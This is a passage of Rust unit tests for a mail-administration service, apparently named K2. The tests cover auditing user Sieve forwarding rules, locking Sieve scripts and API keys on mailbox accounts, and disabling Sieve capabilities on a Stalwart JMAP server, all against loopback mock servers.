        let accts = v["accounts"].as_array().expect("accounts");
        let ids: Vec<&str> = accts.iter().map(|e| e["accountId"].as_str().unwrap()).collect();
        assert_eq!(ids, ["a", "c", "d", "ext"], "b is clean and fully locked → not listed: {v}");
        let a = accts.iter().find(|e| e["accountId"] == "a").expect("a");
        assert_eq!(a["address"], "alice@example.test");
        assert_eq!(a["sieveLocked"], false);
        assert_eq!(a["apiKeyLocked"], false);
        assert_eq!(a["apiKeys"], 0);
        assert_eq!(a["k2Scripts"], 1);
        assert_eq!(a["scripts"][0]["name"], "mine");
        assert_eq!(a["scripts"][0]["targets"][0]["domain"], "outside.test");
        assert!(!v.to_string().contains("exfil@"), "domain only: {v}");
        let c = accts.iter().find(|e| e["accountId"] == "c").expect("c holds a key");
        assert_eq!(c["apiKeyLocked"], true);
        assert_eq!(c["apiKeys"], 1);
        let d = accts.iter().find(|e| e["accountId"] == "d").expect("d can still mint keys");
        assert_eq!(d["sieveLocked"], true);
        assert_eq!(d["apiKeyLocked"], false);
        let e = accts.iter().find(|e| e["accountId"] == "ext").expect("ext");
        assert_eq!(e["k2Minted"], false);
        assert_eq!(e["apiKeys"], 2);
    }

    // ── K2's own forwards keep working ──

    /// K2 writes forwards through the service account's API key on the
    /// mailbox's accountId (delegation) — never a mailbox credential, so
    /// a mailbox's `disabledPermissions` can't touch it. This drives the
    /// real `patch_user_sieve` against a loopback Stalwart and checks the
    /// credential and the calls it makes.
    #[test]
    fn k2_forward_still_writes_through_the_service_key_after_the_lock() {
        use crate::mail::jmap::tests::{body_json, spawn_mock_server};
        let session = serde_json::json!({
            "apiUrl": "/jmap/",
            "uploadUrl": "/jmap/upload/{accountId}/",
            "downloadUrl": "/jmap/download/{accountId}/{blobId}/{name}?accept={type}",
            "accounts": { "svc": {} },
            "primaryAccounts": { "urn:stalwart:jmap": "svc" },
        })
        .to_string();
        let query = serde_json::json!({ "methodResponses": [["SieveScript/query", { "ids": [] }, "0"]] }).to_string();
        let blob = serde_json::json!({ "blobId": "Bk2" }).to_string();
        let set = serde_json::json!({
            "methodResponses": [["SieveScript/set", { "created": { "k2": { "id": "s1" } } }, "0"]],
        })
        .to_string();
        // session (discovered once, then cached for Sieve calls), query,
        // session (blob upload reads it fresh), upload, set.
        let (port, rx) = spawn_mock_server(vec![session.clone(), query, session, blob, set]);
        let c = StalwartClient::new(format!("http://127.0.0.1:{port}"), "k2-service-key");
        let next = sieve_user::patch_user_sieve(
            &c,
            "alice-acct",
            sieve_user::SievePatch::SetForward(sieve_user::ForwardBlock {
                dest: "carol@example.test".into(),
                keep: true,
                guard: None,
            }),
        )
        .expect("K2 forward write");
        assert_eq!(next.forward.as_ref().map(|f| f.dest.as_str()), Some("carol@example.test"));
        let reqs: Vec<String> = (0..5).map(|_| rx.recv().expect("request")).collect();
        for r in &reqs {
            let lower = r.to_ascii_lowercase();
            assert!(lower.contains("authorization: bearer k2-service-key"), "service key on every call: {r}");
            assert!(!lower.contains("authorization: basic"), "never a mailbox credential: {r}");
        }
        assert!(reqs[3].contains("POST /jmap/upload/alice-acct/"), "{}", reqs[3]);
        let set_req = body_json(&reqs[4]);
        assert_eq!(set_req["methodCalls"][0][0], "SieveScript/set");
        assert_eq!(set_req["methodCalls"][0][1]["accountId"], "alice-acct");
        assert_eq!(set_req["methodCalls"][0][1]["create"]["k2"]["name"], "k2");
        assert_eq!(set_req["methodCalls"][0][1]["onSuccessActivateScript"], "#k2");
        // What K2 just wrote is classified as K2's own (kept by the reconcile).
        let src = sieve_user::compose(&next).expect("script");
        assert!(reqs[3].contains(&src), "uploaded blob is the composed script");
        assert_eq!(classify("k2", &src, &hosted).0, Owner::K2);
    }

    #[test]
    fn deactivate_destroy_activate_are_separate_sieve_calls() {
        use crate::mail::jmap::tests::{body_json, spawn_mock_server};
        let session =
            r#"{"apiUrl": "/jmap/", "accounts": {"svc": {}}, "primaryAccounts": {"urn:stalwart:jmap": "svc"}}"#
                .to_string();
        let ok = serde_json::json!({ "methodResponses": [["SieveScript/set", {}, "0"]] }).to_string();
        let destroyed =
            serde_json::json!({ "methodResponses": [["SieveScript/set", { "destroyed": ["u"] }, "0"]] }).to_string();
        // The session is discovered once and cached for the next calls.
        let (port, rx) = spawn_mock_server(vec![session, ok.clone(), destroyed, ok]);
        let c = StalwartClient::new(format!("http://127.0.0.1:{port}"), "k2-service-key");
        SieveLockApi::deactivate(&c, "a").expect("deactivate");
        SieveLockApi::destroy(&c, "a", &["u".to_string()]).expect("destroy");
        SieveLockApi::activate(&c, "a", "k").expect("activate");
        let _ = rx.recv().expect("session");
        let bodies: Vec<Value> = (0..3).map(|_| body_json(&rx.recv().expect("call"))).collect();
        let d = &bodies[0]["methodCalls"][0][1];
        assert_eq!(d["onSuccessDeactivateScript"], true);
        assert_eq!(d["accountId"], "a");
        assert!(d.get("destroy").is_none(), "deactivate rides alone: {d}");
        assert_eq!(bodies[0]["using"][1], "urn:ietf:params:jmap:sieve");
        let x = &bodies[1]["methodCalls"][0][1];
        assert_eq!(x["destroy"][0], "u");
        assert!(x.get("onSuccessDeactivateScript").is_none());
        assert_eq!(bodies[2]["methodCalls"][0][1]["onSuccessActivateScript"], "k");
    }

    #[test]
    fn interpreter_write_touches_only_disable_capabilities() {
        use crate::mail::jmap::tests::{body_json, spawn_mock_server};
        let session =
            r#"{"apiUrl": "/jmap/", "accounts": {"svc": {}}, "primaryAccounts": {"urn:stalwart:jmap": "svc"}}"#
                .to_string();
        let get = serde_json::json!({ "methodResponses": [["x:SieveUserInterpreter/get", {
            "list": [{ "id": "singleton", "disableCapabilities": { "vacation-seconds": true } }] }, "0"]] })
        .to_string();
        let set = serde_json::json!({ "methodResponses": [["x:SieveUserInterpreter/set", {
            "updated": { "singleton": null } }, "0"]] })
        .to_string();
        let reload = serde_json::json!({ "methodResponses": [["x:Action/set", {
            "created": { "k2": { "id": "r1" } } }, "0"]] })
        .to_string();
        let (port, rx) = spawn_mock_server(vec![session, get, set, reload]);
        let c = StalwartClient::new(format!("http://127.0.0.1:{port}"), "k2-service-key");
        assert_eq!(ensure_caps_off(&c), CapsOutcome::TurnedOff);
        let _ = rx.recv().expect("session");
        let g = body_json(&rx.recv().expect("get"));
        assert_eq!(g["methodCalls"][0][0], "x:SieveUserInterpreter/get");
        let s = body_json(&rx.recv().expect("set"));
        let upd = &s["methodCalls"][0][1]["update"]["singleton"];
        assert_eq!(upd, &serde_json::json!({ "disableCapabilities": { "enotify": true, "vacation-seconds": true } }));
        assert!(!s.to_string().contains("maxRedirects"), "{s}");
        let r = body_json(&rx.recv().expect("reload"));
        assert_eq!(r["methodCalls"][0][1]["create"]["k2"]["@type"], "ReloadSettings");
    }

    #[test]
    fn plan_caps_keeps_operator_entries_and_is_idempotent() {
        assert_eq!(plan_caps(&Value::Null).unwrap(), Some(serde_json::json!({ "enotify": true })));
        assert_eq!(
            plan_caps(&serde_json::json!(["vacation-seconds"])).unwrap(),
            Some(serde_json::json!({ "enotify": true, "vacation-seconds": true }))
        );
        assert_eq!(plan_caps(&serde_json::json!({ "enotify": true })).unwrap(), None);
        assert!(plan_caps(&serde_json::json!(3)).is_err());
    }
}
